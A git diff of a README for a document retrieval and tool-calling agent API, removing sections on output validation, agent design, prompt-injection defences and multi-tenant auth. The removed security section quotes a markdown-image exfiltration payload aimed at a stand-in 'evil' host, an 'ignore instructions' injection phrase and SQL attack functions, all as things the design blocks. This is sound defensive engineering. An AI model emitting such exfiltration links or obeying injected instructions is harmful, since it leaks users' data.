-   number must exist in the retrieved set (a schema can't know how many
-   chunks were retrieved). A fabricated citation is now a retryable failure,
-   not just a flag.
+- Use `.env.example` to identify required settings.
+- Store real credentials only in a local `.env` file or a secret-management system.
+- Ensure `.env` is excluded by `.gitignore`.
+- Do not include tokens, passwords, or API keys in logs, screenshots, evaluation artifacts, or commits.
+- Review staged files with `git status` before pushing changes.
 
-On failure at layer 2 or 3, the model's bad output **and the exact error** are
-appended as messages and it is asked again, up to `LLM_VALIDATION_RETRIES`
-(default 2). After that: `502 invalid_model_output` with the per-attempt
-errors in `details` — never a silently guessed answer.
+## Project Scope
 
-### Trade-off memo: why this design, not the alternatives
+Week 6 extends the existing document retrieval and answer-generation pipeline with LangChain composition, tool-calling agent behavior, validated structured responses, streaming, and security analysis. The central engineering goal is to compare these approaches while retaining explicit retrieval logic, citation checks, tests, and evaluation.
 
-- **Feed the error back vs. resend the same prompt.** At temperature > 0 a
-  blind resend is a re-roll; telling the model what was wrong is a
-  correction. Only the *last* failed attempt is fed back, so the prompt can't
-  grow per retry; echoed bad output is capped at 2,000 chars (cost, and a
-  smaller injection surface).
-- **`bind(response_format=...)` + our own parse vs. `with_structured_output`.**
-  The one-liner looked right and the mocked tests passed — then running the
-  *real* LangChain/OpenAI-SDK path against a mocked HTTP server showed that
-  with `json_schema` the SDK parses inside the call and **raises on bad
-  output, even with `include_raw=True`**. The bad text never reaches a retry
-  loop and a malformed reply becomes a 500. Owning the parse step puts every
-  failure in one place with the raw text intact, for ~10 lines of code.
-  (`tests/test_structured_wire.py` pins this down.)
-- **Two retry layers, deliberately.** `ChatOpenAI(max_retries)` handles
-  transport (timeout / 429 / 5xx). The validation loop handles "HTTP 200,
-  wrong content". Provider `APIError`s (auth, bad request) are *not* re-asked:
-  they fail identically every time. Worst-case calls per request =
-  `(1 + LLM_VALIDATION_RETRIES) × (1 + LLM_MAX_RETRIES)` = 9 by default —
-  know that number before putting this behind a rate limit.
-- **Refusals are normalized** to the standard "I don't know…" string so all
-  three `/ask*` endpoints refuse identically.
-- **Settings, not code, for provider quirks:** `LLM_STRUCTURED_METHOD` =
-  `json_schema` | `json_mode` | `none`. If a Groq model rejects `json_schema`,
-  change the setting; validation + retry keeps the endpoint correct either
-  way (just with more retries).
+## Related Documentation
 
-### Failure modes (documented)
-
-| Situation | Behavior |
-|---|---|
-| Model returns prose / broken JSON | Retry with error feedback; 502 `invalid_model_output` after budget |
-| Schema-valid but cites a non-existent source | Semantic failure → retry |
-| Model says `answerable=false` | 200, normalized refusal, no citations |
-| Nothing retrieved | LLM never called, `attempts: 0` |
-| Provider down / auth error | 502 `provider_error`, no validation retry |
-| Model wraps JSON in a ```` ```json ```` fence | Accepted without retry (formatting habit) |
-
-### Likely interviewer questions
-
-1. *"LLMs are nondeterministic — how do you build a reliable API on one?"*
-   Define the contract, validate every output, retry with feedback, bound the
-   retries, and fail loudly with a distinct error. Treat the model like any
-   untrusted upstream.
-2. *"If the provider supports JSON-schema mode, why validate again?"*
-   Constrained decoding shapes syntax, not truth: it can still cite source 99
-   of 3. And it's provider-dependent — validation is what makes the endpoint
-   correct when the provider ignores or lacks it.
-3. *"What does a retry cost?"* Latency and tokens per attempt, multiplied by
-   the transport retry layer. Hence a small cap, error feedback (so retry 2
-   usually works), and a metric on `attempts` to spot a regressing prompt or
-   model.
-
-### Not verified here
-
-All 107 tests run offline; the real client/SDK request path is exercised with
-a mocked HTTP server. **Not yet run against live Groq** — before trusting it,
-call `/ask/structured` once with your real key and check `attempts` (and that
-`openai/gpt-oss-20b` accepts `json_schema`; fall back to `json_mode` if not).
-
-## Week 6, Days 36 / 38 / 39 — Tool-calling agent, streaming trace, injection + scope
-
-`POST /agent` runs a small agent loop (written by hand, ~100 lines in
-`app/agent/loop.py`, not a framework executor) with exactly **three tools**:
-
-| Tool | What it does | Why it is bounded |
-|---|---|---|
-| `calculator` | exact arithmetic | AST-walked, numbers and `+ - * / // % **` only; exponent/base capped |
-| `document_search` | pgvector retrieval, numbered `[N]` passages | scoped to the request's allowed documents; text returned as *untrusted* |
-| `query_documents` | read-only SQL over document **metadata** | allowlist validator + scoped views + row limit + timeout + read-only txn |
-
-```bash
-# non-streaming: answer + full trace of tool calls
-curl -X POST http://127.0.0.1:8000/agent -H "Content-Type: application/json" \
-  -d '{"query": "How many documents do I have, and what is 25 * 12?"}'
-
-# restrict what the agent may see / use
-curl -X POST http://127.0.0.1:8000/agent -H "Content-Type: application/json" \
-  -d '{"query": "leave policy?", "document_ids": [1], "allowed_tools": ["document_search"]}'
-
-# streaming (SSE): tool_call / tool_result / tool_denied / token / final / done
-curl -N -X POST http://127.0.0.1:8000/agent/stream -H "Content-Type: application/json" \
-  -d '{"query": "What is the annual leave policy?"}'
-```
-
-PowerShell: `Invoke-RestMethod -Uri http://127.0.0.1:8000/agent -Method Post -ContentType "application/json" -Body (@{query="what is 25*12?"} | ConvertTo-Json) | ConvertTo-Json -Depth 8`
-
-### The loop and why it terminates (Day 36 / 38)
-
-```
-messages = [system, question]
-repeat <= max_steps:   stream reply
-    no tool calls -> that reply is the answer, stop
-    tool calls    -> run each (checked, bounded), append results, go again
-steps exhausted while still calling tools -> "answer with what you have",
-    tools unbound  (budget_exhausted = true)
-```
-
-Termination does not rely on the model behaving. Three independent stops:
-`max_steps`, `max_tool_calls` (denied calls count too, so probing is bounded),
-and duplicate-call rejection (the cheapest way to loop is to repeat yourself).
-Bad calls — invalid arguments, unknown tools, rejected SQL — come back as
-*results* the model can recover from; they never crash the loop.
-
-Streaming: the model's reply is consumed with `astream`, tool-call fragments are
-accumulated, and answer text is forwarded as `token` events as it settles.
-Event order: `(tool_call, tool_result|tool_denied)*` → `token*` → `final` → `done`.
-An `error` event replaces `done` on failure (the HTTP status is already 200 by then).
-
-### Security: assume the model is compromised (Day 39)
-
-Full write-up: [`docs/AGENT_THREAT_MODEL.md`](docs/AGENT_THREAT_MODEL.md). In short:
-
-- **Authorization lives in code, not in the prompt.** Document scope and the tool
-  allowlist are enforced by the executor from a server-built `AgentScope`; tool
-  arguments (`extra="forbid"`) can never widen it.
-- **Retrieved text is untrusted.** It is delimited, labelled, scanned by a heuristic
-  detector (telemetry only — regexes are bypassable) and never trusted to be an
-  instruction.
-- **The output channel is sanitized**, including while streaming: markdown images,
-  links, risky HTML and bare URLs are removed, closing the classic exfiltration route
-  (model emits `![x](http://evil/?d=<stolen data>)`, the client renders it).
-- **Tests assume an obedient attacker**: `tests/test_agent_security.py` scripts a model
-  that follows every injected instruction, then proves nothing leaks.
-
-### Trade-off memo: why this design
-
-- **Hand-written loop vs. LangChain `AgentExecutor`.** The loop is short enough to
-  read in one sitting and every safety decision (budgets, denial, sanitizing) lives in
-  the one place it is enforced. A framework executor would hide exactly the part an
-  interviewer asks about. Cost: we maintain it. LangChain still supplies the model
-  client, tool binding and message types.
-- **Three tools, not twenty.** Each tool is attack surface. All three are read-only and
-  side-effect-free, so the worst a hijacked model can do is *read what the scope allows*.
-  The first tool that can write or send anything needs a human-approval step.
-- **Strict SQL allowlist, not a denylist.** A denylist always misses something
-  (`pg_sleep`, `pg_read_file`, `UNION` tricks). The validator accepts only known
-  keywords/functions/columns, then the query runs against *scoped views*
-  (`scoped_documents`, `scoped_chunks`) with no text or embedding columns. Chunk text is
-  deliberately unreachable from SQL: reading content must go through `document_search`,
-  which numbers sources and wraps text as untrusted. **Production would add a dedicated
-  read-only DB role** — a layer the application cannot get wrong. Not implemented here.
-- **Scope pushed into the query *and* re-checked on results.** Query-level filtering
-  keeps `top_k` slots for in-scope chunks; the recheck means a future retrieval bug
-  can't leak. Each layer has its own test (mutation-checked).
-- **Sanitize the output rather than trust the model not to emit links.** The agent has no
-  legitimate reason to output a URL, so it outputs none. The streaming sanitizer holds
-  back unfinished constructs and is tested to equal the batch sanitizer for any chunking.
-- **Where scope comes from.** Since Week 7 the agent's document scope is computed server-side
-  from the authenticated caller (tenant, role, private visibility); the request's `document_ids`
-  can only *narrow* it. (In Week 6 it came straight from the request body — not a security
-  boundary — which is why this was the top residual risk in the threat model.)
-
-### Failure modes (documented)
-
-| Situation | Behavior |
-|---|---|
-| Model asks for a document outside scope | `tool_denied`; same message whether the id exists or not (no existence oracle) |
-| Model calls a tool the request didn't allow | `tool_denied`; the tool never runs |
-| Model invents arguments (`tenant_id`, `document_ids`) | `invalid arguments` result; scope unchanged |
-| Poisoned document says "ignore instructions…" | flagged in trace + logged; tools/scope/sanitizer still bound the damage |
-| Model emits image/link/URL in the answer | removed from `answer` and from streamed tokens |
-| Malformed or hostile SQL | rejected with a short reason; DB untouched |
-| Runaway SQL | statement timeout (Postgres), rollback, session stays usable |
-| Model loops / repeats a call | duplicate rejected; step and tool-call budgets force a final answer |
-| Oversized tool output | truncated to `AGENT_MAX_TOOL_OUTPUT_CHARS` before it reaches the model |
-| Provider down | `/agent` → 502 `provider_error`; `/agent/stream` → `error` event |
-
-### Likely interviewer questions
-
-1. *"How do you defend against prompt injection?"* — You can't make the model
-   immune, so you bound what a hijacked model can do: authorization in code, read-only
-   least-privilege tools, scope enforced outside the model, a closed output channel,
-   and tests that assume the model obeys the attacker.
-2. *"Who decides which documents the agent can see?"* — The server, from the authenticated
-   principal. A request field can only narrow that set, never widen it.
-3. *"Why not let the model write arbitrary SQL?"* — Allowlist + scoped views + limits
-   + (in production) a read-only role; and chunk text is excluded so content access
-   always goes through the cited, untrusted-wrapped path.
-4. *"When shouldn't you use an agent?"* — When one retrieval + one generation answers
-   the question: direct RAG is cheaper, faster, and has far less attack surface.
-   (The measured comparison is Sunday's memo.)
-
-### Verified vs. not verified
-
-- **Verified (offline; the suite is now 382 tests, see Week 7):** loop, tools, SQL guard, scope, sanitizer
-  (including chunking equivalence), injection scenarios with a scripted obedient model,
-  and the real LangChain/OpenAI-SDK request + streaming path against a mocked server.
-- **Verified on real Postgres 16 + pgvector (separate script, not in the suite):** the
-  same loop sequence, scoped SQL views, read-only transaction, statement timeout +
-  recovery, row limit.
-- **Not verified:** a live Groq run of the agent. Tool calling quality varies by model —
-  `llama-3.1-8b-instant` and `openai/gpt-oss-20b` may differ in how reliably they emit
-  valid tool calls. Run it once and watch `trace` before trusting it.
-- **Known gaps:** the injection detector is heuristic; no per-tenant/user rate limiting on the
-  agent endpoints (each request can cost up to `max_steps + 1` model calls); no
-  human-approval step because there are no write tools; SQL role hardening is a
-  production recommendation, not implemented.
-
-## Week 7 — Multi-tenant platform: auth, RBAC, tenant isolation, migrations
-
-Design, decisions, failure modes and interview answers: [`docs/WEEK7_TENANCY.md`](docs/WEEK7_TENANCY.md).
-Week 6's agent-vs-RAG memo: [`docs/WEEK6_AGENT_VS_RAG.md`](docs/WEEK6_AGENT_VS_RAG.md).
-
-### Quick start
-
-```bash
-docker compose up -d --build        # migrations run automatically (tenancy + row-level security)
-
-# 1. create a tenant and its first user (the OWNER) -- returns a token
-curl -s -X POST http://127.0.0.1:8000/auth/register -H "Content-Type: application/json" \
-  -d '{"tenant_name": "Acme", "email": "owner@acme.test", "password": "a-strong-password"}'
-TOKEN=...   # paste access_token from the response (or POST /auth/login later)
-
-# 2. use it
-curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8000/me
-curl -s -H "Authorization: Bearer $TOKEN" -F "file=@notes.txt" \
-  "http://127.0.0.1:8000/documents?chunk_size=500&chunk_overlap=0&visibility=private"
-curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  http://127.0.0.1:8000/ask/structured -d '{"query": "what does the document say?"}'
-
-# 3. teammates (owner/admin): create users, change roles
-curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-  http://127.0.0.1:8000/users -d '{"email": "ed@acme.test", "password": "another-password", "role": "editor"}'
-```
-
-PowerShell:
-
-```powershell
-$r = Invoke-RestMethod -Uri http://127.0.0.1:8000/auth/register -Method Post -ContentType "application/json" `
-  -Body (@{tenant_name="Acme"; email="owner@acme.test"; password="a-strong-password"} | ConvertTo-Json)
-$h = @{ Authorization = "Bearer $($r.access_token)" }
-Invoke-RestMethod -Uri http://127.0.0.1:8000/me -Headers $h
-Invoke-RestMethod -Uri http://127.0.0.1:8000/documents -Headers $h
-```
-
-**Your existing documents** (ingested before tenancy) were adopted by a tenant called `default` during the
-migration. To reach them, give that tenant an owner:
-
-```bash
-docker compose exec api python -m app.cli.bootstrap_owner --email you@example.com --password 'a-strong-password'
-```
-
-### New endpoints
-
-| Endpoint | Who | Notes |
-|---|---|---|
-| `POST /auth/register`, `POST /auth/login`, `GET /me` | public / any | JWT bearer tokens |
-| `GET/POST /users`, `PATCH /users/{id}` | admin+ | role/active changes follow the rules in WEEK7_TENANCY.md |
-| `GET /audit` | admin+ | the tenant's own audit trail |
-| `PATCH /documents/{id}` | owner of the doc, or admin+ | title / visibility; send `expected_version` (409 on stale) |
-| `DELETE /documents/{id}` | owner of the doc, or admin+ | soft delete (204) |
-| everything else (`/documents`, `/retrieve`, `/ask*`, `/agent*`) | by role | now tenant- and visibility-scoped |
-
-### Isolation in one paragraph
-
-Every read goes through one `AccessFilter` (tenant, soft delete, private visibility); retrieval *requires* it, so
-forgetting to scope a query is a `TypeError`, not a leak; foreign ids return **404, not 403**; and Postgres
-**row-level security** enforces the tenant again underneath (fail-closed). `JWT_SECRET` must be set for any
-non-development environment — the app refuses to start on the default.
-
-### Tests and verification
-
-```bash
-pytest -q                                   # offline suite (SQLite; no Docker, no API key)
-python scripts/verify_postgres.py --admin-url postgresql+asyncpg://USER:PASS@HOST:5432/postgres
-```
-
-The second command needs a reachable Postgres with pgvector and `CREATEDB` rights; it builds a throwaway
-database and checks the migrations (legacy data, both directions, no drift), row-level security, and the real API
-end to end (44 checks). Not part of `pytest` because it needs a live server — run it before trusting a schema change.
-
-```bash
-python eval/run_compare.py --email you@example.com --password '...'   # direct vs structured vs agent, needs your live API + LLM key
-```
-
-### Still to do in the capstone (Thu–Sun of Week 7, then Week 8)
-
-Async ingestion with status transitions and idempotency (needs a queue + worker), conversational RAG with history,
-per-tenant quotas / rate limits and metrics, the distributed-SQL lab; then collaborative editing (Yjs), explicit
-locks, failure drills and load tests.
-# agentic-rag-pipeline
+- [Agent threat model](docs/AGENT_THREAT_MODEL.md)
+- [Direct, structured, and agent comparison](docs/WEEK6_AGENT_VS_RAG.md)
